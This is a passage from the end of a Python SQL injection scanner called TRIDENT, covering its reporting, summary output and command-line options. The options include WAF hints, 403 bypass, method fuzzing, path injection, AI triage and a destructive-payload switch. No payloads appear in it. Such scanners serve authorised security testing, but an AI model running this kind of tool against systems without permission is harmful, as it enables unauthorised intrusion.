                    done += 1
                    ip = futures[fut]
                    try:
                        res = fut.result()
                        all_findings.extend(res)
                        if not ip.worth_testing:
                            smoke_skipped[0] += 1
                    except Exception as e:
                        log(f"error testing {ip}: {e}", "warn", "SQLI")

                    if done % 25 == 0 or done == total:
                        el = time.time() - t0
                        rate = done / el if el > 0 else 0
                        eta = (total - done) / rate if rate > 0 else 0
                        log(f"progress {done}/{total}  hits={len(all_findings)}  "
                            f"smoke-skip={smoke_skipped[0]}  "
                            f"~{rate:.1f}/s  ETA {format_duration(eta)}",
                            "info", "SQLI")
        except KeyboardInterrupt:
            log("interrupted — saving partial findings", "warn", "SQLI")
        finally:
            elapsed = time.time() - t0

        # Report
        section("TRIDENT :: SQLi :: REPORT")
        by_conf = {}
        by_sev = {}
        by_method = {}
        by_loc = {}
        by_ai = {}
        for f in all_findings:
            by_conf[f["confidence"]] = by_conf.get(f["confidence"], 0) + 1
            by_sev[f["severity"]] = by_sev.get(f["severity"], 0) + 1
            by_method[f.get("verification_method", "?")] = \
                by_method.get(f.get("verification_method", "?"), 0) + 1
            loc = f.get("injection_point", {}).get("location", "?")
            by_loc[loc] = by_loc.get(loc, 0) + 1
            v = (f.get("ai_triage") or {}).get("verdict")
            if v:
                by_ai[v] = by_ai.get(v, 0) + 1

        if all_findings:
            for s in ("critical", "high", "medium", "low", "info"):
                if s in by_sev:
                    log(f"severity {s:9} : {by_sev[s]}",
                        "ok" if s in ("critical", "high", "medium") else "info",
                        "SQLI")
            log(f"methods        : {by_method}", "info", "SQLI")
            log(f"by location    : {by_loc}", "info", "SQLI")
            if by_ai:
                log(f"AI verdicts    : {by_ai}", "info", "SQLI")
            log(f"total saved    : {len(all_findings)}", "ok", "SQLI")
        else:
            log("no SQLi findings — the target is silent", "info", "SQLI")

        with self._host_lock:
            waf_hosts = dict(self.host_waf)
            hosts_403 = dict(self.host_403)
            bypass_success = {h: v.get("entry_id") for h, v in self.host_bypass.items()}

        if waf_hosts:
            log(f"WAF hosts      : {waf_hosts}", "info", "SQLI")
        if hosts_403:
            log(f"403 hosts      : {hosts_403}", "info", "SQLI")
        if bypass_success:
            log(f"403 bypassed   : {bypass_success}", "ok", "SQLI")
        if smoke_skipped[0]:
            log(f"smoke-skipped  : {smoke_skipped[0]} inert IPs", "info", "SQLI")
        if self.ai and self.ai.available():
            st = self.ai.stats
            log(f"AI usage       : {st['calls']} calls "
                f"({st['ok']} ok / {st['failed']} fail) "
                f"tokens {st['tokens_in']}/{st['tokens_out']}",
                "info", "SQLI")

        log(f"elapsed        : {format_duration(elapsed)}", "info", "SQLI")

        # Save metadata
        try:
            save_json(self.findings_root / "_summary.json", {
                "trident_version": TRIDENT_VERSION,
                "total_saved":     len(all_findings),
                "total_dropped":   len(self.ai_dropped),
                "by_confidence":   by_conf,
                "by_severity":     by_sev,
                "by_ai_verdict":   by_ai,
                "by_method":       by_method,
                "by_location":     by_loc,
                "smoke_filtered":  smoke_skipped[0],
                "header_set":      self.header_set,
                "path_mode":       self.path_mode,
                "waf_hint":        self.waf_hint,
                "dbms_hint":       self.dbms_hint,
                "min_severity":    self.min_severity,
                "method_fuzz":     self.method_fuzz,
                "bypass_403":      self.bypass_403_enabled,
                "waf_hosts":       waf_hosts,
                "hosts_403":       hosts_403,
                "bypass_success":  bypass_success,
                "ai_provider":     (self.ai.provider
                                     if (self.ai and self.ai.available()) else None),
                "ai_model":        (self.ai.model
                                     if (self.ai and self.ai.available()) else None),
                "ai_usage":        (dict(self.ai.stats)
                                     if (self.ai and self.ai.available()) else None),
                "elapsed_seconds": round(elapsed, 1),
                "timestamp":       now_iso(),
                "findings": [
                    {"url": f["url"], "param": f["parameter"],
                     "location": f.get("injection_point", {}).get("location"),
                     "severity": f.get("severity"),
                     "confidence": f["confidence"],
                     "method": f.get("verification_method"),
                     "payload_name": f.get("payload_name"),
                     "ai_verdict": (f.get("ai_triage") or {}).get("verdict"),
                     "bypass_entry_id": (f.get("injection_point") or {}).get("bypass_entry_id")}
                    for f in all_findings
                ],
            })
        except Exception as e:
            log(f"failed to write summary: {e}", "warn", "SQLI")

        if self.ai_dropped:
            try:
                save_json(self.findings_root / "_ai_dropped.json",
                          self.ai_dropped)
            except Exception:
                pass

        return all_findings


# =============================================================================
#  ENTRY
# =============================================================================
def run(program_dir, **kwargs):
    return SQLiScanner(program_dir, **kwargs).run()


def main():
    ap = argparse.ArgumentParser(
        description="TRIDENT SQLi scanner v1.0.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("program_dir", help="workspace root (contains sites/)")
    ap.add_argument("--sites-root", default=None,
                    help="override sites/ directory")
    ap.add_argument("--waf", default=None, help="WAF hint (cloudflare, awswaf, ...)")
    ap.add_argument("--dbms", default=None, help="DBMS hint (mysql, postgresql, ...)")
    ap.add_argument("--cookie", default=None)
    ap.add_argument("--user-agent", default=None)
    ap.add_argument("--headers-dir", default=None)
    ap.add_argument("--header", action="append", default=[],
                    help="extra header, repeatable: 'Name: value'")
    ap.add_argument("--no-auth", action="store_true")
    ap.add_argument("--no-confirm-timing", action="store_true")
    ap.add_argument("--no-confirm-medium", action="store_true")
    ap.add_argument("--time-threshold", type=float, default=4.0)
    ap.add_argument("--min-severity", default="medium",
                    choices=["critical", "high", "medium", "low", "info"])
    ap.add_argument("--no-ai", action="store_true",
                    help="disable AI triage entirely")
    ap.add_argument("--ai-provider", default=None,
                    help="force a specific AI provider")
    ap.add_argument("--no-ai-severity", action="store_true")
    ap.add_argument("--max-payloads-per-ip", type=int, default=50)
    ap.add_argument("--allow-destructive", action="store_true")
    ap.add_argument("--method-fuzz", action="store_true")
    ap.add_argument("--no-bypass-403", action="store_true")
    ap.add_argument("--max-bypass-attempts", type=int, default=40)
    ap.add_argument("--no-smoke-test", action="store_true")
    ap.add_argument("--header-set", default="minimal",
                    choices=list(HEADER_SETS.keys()))
    ap.add_argument("--path-injection", default="id_like",
                    choices=["id_like", "all", "off"])
    ap.add_argument("--safe", action="store_true",
                    help="safe mode: minimal headers, no paths, no method-fuzz")
    ap.add_argument("--workers", type=int, default=6)
    ap.add_argument("--delay", type=float, default=0.12)
    ap.add_argument("--timeout", type=int, default=12)

    args = ap.parse_args()

    cli_headers = {}
    for h in args.header:
        if ":" in h:
            n, _, v = h.partition(":")
            cli_headers[n.strip()] = v.strip()

    header_set = args.header_set
    path_mode = args.path_injection
    method_fuzz = args.method_fuzz
    if args.safe:
        header_set = "minimal"
        path_mode = "off"
        method_fuzz = False
        log("safe mode: headers=minimal paths=off method_fuzz=off",
            "warn", "SQLI")

    run(
        args.program_dir,
        sites_root=args.sites_root,
        max_workers=args.workers,
        delay=args.delay,
        timeout=args.timeout,
        waf_hint=args.waf,
        dbms_hint=args.dbms,
        time_threshold=args.time_threshold,
        confirm_timing=not args.no_confirm_timing,
        min_severity=args.min_severity,
        use_ai=not args.no_ai,
        ai_severity=not args.no_ai_severity,
        ai_provider=args.ai_provider,
        headers_dir=args.headers_dir,
        cli_headers=cli_headers,
        no_auth=args.no_auth,
        max_payloads_per_ip=args.max_payloads_per_ip,
        allow_destructive=args.allow_destructive,
        confirm_medium=not args.no_confirm_medium,
        method_fuzz=method_fuzz,
        bypass_403=not args.no_bypass_403,
        max_bypass_attempts=args.max_bypass_attempts,
        header_set=header_set,
        path_mode=path_mode,
        smoke_test=not args.no_smoke_test,
        cookie=args.cookie,
        user_agent=args.user_agent,
    )


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        log("interrupted", "warn", "SQLI")
        sys.exit(130)
